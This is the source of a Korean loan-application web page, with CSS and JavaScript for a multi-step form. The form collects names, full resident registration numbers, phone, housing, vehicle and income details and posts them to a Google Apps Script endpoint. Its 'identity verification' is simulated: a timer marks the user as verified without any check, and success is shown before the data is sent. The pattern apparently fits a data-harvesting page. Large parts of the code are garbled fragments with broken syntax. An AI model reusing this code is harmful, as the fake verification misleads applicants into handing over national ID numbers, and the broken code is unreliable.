<style>

    /* 개인정보 팝업 전체 */
.privacy-modal{
    display:none;
    position:fixed;

    left:0;
    width:100%;
    height:100%;

    z-index:99999;

    justify-content:center;

/* 팝업 열렸을 때 */
.privacy-modal.open{
    display:flex;
}

/* 가운데 흰색 박스 */
.privacy-box{
    width:96%;
    max-width:700px;

    height:96vh;

    background:white;
    border-radius:14px;

<script>


// STEP1 → STEP2


function nextStep1(){
if(!verified){

    alert("먼저 본인확인을 완료해주세요.");

    return;

}

let name=document.getElementById("name").value;

let jumin1=document.getElementById("jumin1").value;

let jumin2=document.getElementById("jumin2").value;

let phone=document.getElementById("phone").value;

let tel=document.getElementById("tel").value;



if(
name=="" ||
jumin1.length!==6 ||
jumin2.length!==7 ||
phone=="" ||
tel==""

){

alert("필수 정보를 입력해주세요.");

return;

}



document.getElementById("step1").classList.remove("active");

document.getElementById("step2").classList.add("active");


}








// STEP2 → STEP3


function nextStep2(){


let house=document.getElementById("house").value;

let car=document.getElementById("carHave").value;



if(house=="" || car==""){


alert("주거형태와 차량 보유 여부를 선택해주세요.");

return;


}



document.getElementById("step2").classList.remove("active");

document.getElementById("step3").classList.add("active");


}








function prevStep1(){


document.getElementById("step2").classList.remove("active");

document.getElementById("step1").classList.add("active");


}






function prevStep2(){


document.getElementById("step3").classList.remove("active");

document.getElementById("step2").classList.add("active");


}








// 주거 형태


function houseChange(){


let house=document.getElementById("house").value;


let box=document.getElementById("houseInfo");



if(house=="자가"){


box.innerHTML=`

<label>
주소
</label>

<input id="address" placeholder="주소 입력">

`;

}



else if(house=="전세"){


box.innerHTML=`

<label>
전세 보증금
</label>

<input id="deposit">


<label>
주소
</label>

<input id="address">

`;

}




else if(house=="월세"){


box.innerHTML=`

<label>
월세 보증금
</label>

<input id="deposit">


<label>
월세
</label>

<input id="rent">


<label>
주소
</label>

<input id="address">


`;

}



else{


box.innerHTML="";


}



}









// 차량 표시


function carToggle(){


let value=document.getElementById("carHave").value;


let box=document.getElementById("carInfo");



if(value=="보유"){


box.style.display="block";


}else{


box.style.display="none";


}



}









// 차량 데이터












// 연식 생성


window.onload=function(){


let year=document.getElementById("year");



for(
let i=new Date().getFullYear();
i>=2000;
i--
){


let option=document.createElement("option");


option.value=i;


option.text=i+"년";


year.appendChild(option);


}


}









// 직업 선택


function jobChange(){


let job=document.getElementById("job").value;


let box=document.getElementById("jobInfo");




if(job=="직장인"){

</label>

<input id="company">

</label>

<label>

</label>

<input id="position">

월 소득
</label>

}




else if(job=="개인사업자"){


box.innerHTML=`

사업자명
</label>

else if(job=="주부"){

선택하세요

유

무
</option>

`;

}




else if(job=="학생"){


box.innerHTML=`

<label>
학교명
</label>


<input>


`;

}




else if(job=="무직"){


box.innerHTML=`

<label>
현재 소득 여부
</label>


<select>

<option>
선택하세요
</option>


<option>
유

무
</option>

else{

// 신청하기

carNumber:

:

brand:

?
document.getElementById("brand").value
:
"",



model:

?

"",



year:

company:

: "",

joinDate:

: "",

position:

: "",

: "",

: "",

: "",

: "",

monthlySales:

// 먼저 조회 화면 표시
document.getElementById("step3").style.display="none";
document.getElementById("loading").style.display="block";

    document.getElementById("mainTitle").classList.add("finish-big");
    
setTimeout(function(){

document.getElementById("loadingTitle").innerHTML =
"✔ 대출 신청이 완료되었습니다.";

document.getElementById("loadingText").innerHTML =
"담당자가 확인 후 연락드리겠습니다.";

document.getElementById("finishBtn").style.display="block";

document.getElementById("finishImage").style.display="block";
},1000);
// 그 다음 데이터 전송
fetch(
"https://script.google.com/macros/s/AKfycbwGfgXxNdFESPCFd67mwUvrX57L9xJKIpAaFiVeQefiqHcgID5vExwqVESp75KZjx3I/exec",
{
    method:"POST",
    mode:"no-cors",
    body:JSON.stringify(data)
}).catch(()=>{
    alert("전송 중 오류가 발생했습니다.");
});
}






let verified = false;

function verifyUser(){

    const name = document.getElementById("name").value.trim();
    const jumin1 = document.getElementById("jumin1").value.trim();
    const jumin2 = document.getElementById("jumin2").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const tel = document.getElementById("tel").value;
    const agree = document.getElementById("agree").checked;

    const result = document.getElementById("verifyResult");

    if(name==""){
        result.innerHTML="이름을 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(jumin1.length!=6 || jumin2.length!=7){
        result.innerHTML="주민등록번호를 정확히 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(phone==""){
        result.innerHTML="휴대폰번호를 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(tel==""){
        result.innerHTML="통신사를 선택한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(!agree){
        result.innerHTML="개인정보 수집 및 이용에 동의해주세요.";
        result.style.color="red";
        return;
    }

    result.innerHTML="본인확인 중입니다...";

    setTimeout(function(){

        verified = true;

        result.innerHTML="✔ 본인확인이 완료되었습니다.";
        result.style.color="#0064ff";

        document.getElementById("nextBtn").disabled=false;

    },500);

}
function goFirst(){

    // STEP 숨기기
    document.querySelectorAll(".step").forEach(function(step){
        step.classList.remove("active");
    });

    // STEP1 표시
    document.getElementById("step1").classList.add("active");

    // loading 숨기기
    document.getElementById("loading").style.display="none";
    document.getElementById("finishImage").style.display="none";

    // 조회 화면 원래대로 복원
    document.getElementById("loadingTitle").innerHTML="조회중입니다.";
    document.getElementById("loadingText").innerHTML="입력하신 정보를 확인하고 있습니다.";
    document.getElementById("finishBtn").style.display="none";

    // 입력값 초기화
    document.querySelectorAll("input").forEach(function(input){
        input.value="";
        if(input.type==="checkbox"){
            input.checked=false;
        }
    });

    document.querySelectorAll("select").forEach(function(select){
        select.selectedIndex=0;
    });

    // 본인확인 초기화
    document.getElementById("verifyResult").innerHTML="";

    let verifyBtn=document.querySelector(".verifyBtn");

    if(verifyBtn){
        verifyBtn.innerHTML="본인확인";
        verifyBtn.disabled=false;
        verifyBtn.style.background="#0064ff";
    }

    // 다음 버튼 다시 잠금
    document.getElementById("nextBtn").disabled=true;

    // 인증 상태 초기화
    verified=false;

}
    function openPrivacy(event){

    // 체크박스를 클릭해도 바로 체크되지 않게 함
    event.preventDefault();

    // 개인정보 팝업 열기
    document.getElementById("privacyModal")
            .classList.add("open");
}


function selectPrivacy(isAgree){

    let checkbox =
        document.getElementById("agree");

    // 동의함
    if(isAgree){
        checkbox.checked = true;
    }

    // 동의하지 않음
    else{
        checkbox.checked = false;
    }

    // 팝업 닫기
    document.getElementById("privacyModal")
            .classList.remove("open");

    // 라디오 버튼 초기화
    document
        .querySelectorAll('input[name="privacyAgree"]')
        .forEach(function(radio){
            radio.checked = false;
        });

}

<script>

function phoneHyphen(input){

    let number = input.value.replace(/[^0-9]/g,"");

    if(number.length < 4){

        input.value = number;

    }else if(number.length < 8){

        input.value =
        number.substr(0,3)
        + "-"
        + number.substr(3);

    }else{

        input.value =
        number.substr(0,3)
        + "-"
        + number.substr(3,4)
        + "-"
        + number.substr(7,4);

    }

}
let realJumin2 = "";

function saveJumin(input){

    realJumin2 = input.value.replace(/[^0-9]/g,"");

    if(realJumin2.length > 7){

        realJumin2 = realJumin2.substring(0,7);

    }

    input.value = realJumin2;

}



function maskJumin(input){

    if(realJumin2.length > 1){

        input.value =
        realJumin2.charAt(0)
        +
        "●".repeat(realJumin2.length - 1);

    }

}



function showJumin(input){

    input.value = realJumin2;

}
    
</script>
